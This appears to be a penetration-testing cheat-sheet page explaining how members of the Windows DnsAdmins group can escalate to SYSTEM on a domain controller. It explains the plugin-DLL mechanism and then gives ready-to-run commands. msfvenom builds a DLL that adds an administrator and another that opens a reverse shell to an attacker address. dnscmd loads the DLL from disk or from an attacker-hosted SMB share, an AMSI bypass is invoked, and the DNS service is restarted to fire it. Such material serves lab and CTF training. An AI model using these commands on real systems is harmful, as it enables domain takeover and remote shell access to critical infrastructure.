---
description: DNSAdmin to DC
---

# DnsAdmins

DnsAdmins group members have access to DNS information on the network. The DNS service runs as `NT AUTHORITY\SYSTEM`. This can be used to escalate privileges on a DC or other server that is acting as the DNS server for the domain.&#x20;

{% hint style="info" %}
It is possible to use the built-in [dnscmd](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) utility to specify the path of the plugin DLL. Then load a custom DLL which will be loaded after the DNS service has restarted.
{% endhint %}

### <mark style="color:yellow;">Domain Controllers and DNS</mark>

* In Active Directory environments, Domain Controllers often act as DNS servers.
* DNS servers are critical to Active Directory operation and are accessible to most domain users.
* Microsoft implemented a custom DNS management protocol over **Remote Procedure Call (RPC)** for managing DNS.

{% hint style="info" %}
The combination of the DNS protocol and the custom management protocol introduces a significant attack surface on Domain Controllers.
{% endhint %}

### <mark style="color:yellow;">How to exploit</mark>

Generate a malicious DLL to execute commands

```powershell
# Add user to group
msfvenom -p windows/x64/exec cmd='net group "Administrators" ryan /add' -f dll -o adduser.dll

# Reverse shell
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.153 LPORT=443 -f dll -o reverse.dll
```

Load the custom DLL

```powershell
dnscmd.exe /config /serverlevelplugindll C:\Users\public\reverse.dll
```

From target run&#x20;

```powershell
# From evil-winrm 
Bypass-4MSI
dnscmd.exe /config /serverlevelplugindll 'C:\users\ryan\reverse.dll'

# Using smb server
impacket-smbserver share -smb2support .
dnscmd localhost /config /serverlevelplugindll \\10.10.14.153\share\reverse.dll
```

Finally stop and start DNS again to trigger the DLL file.

```powershell
sc.exe stop dns
sc.exe start dns
```

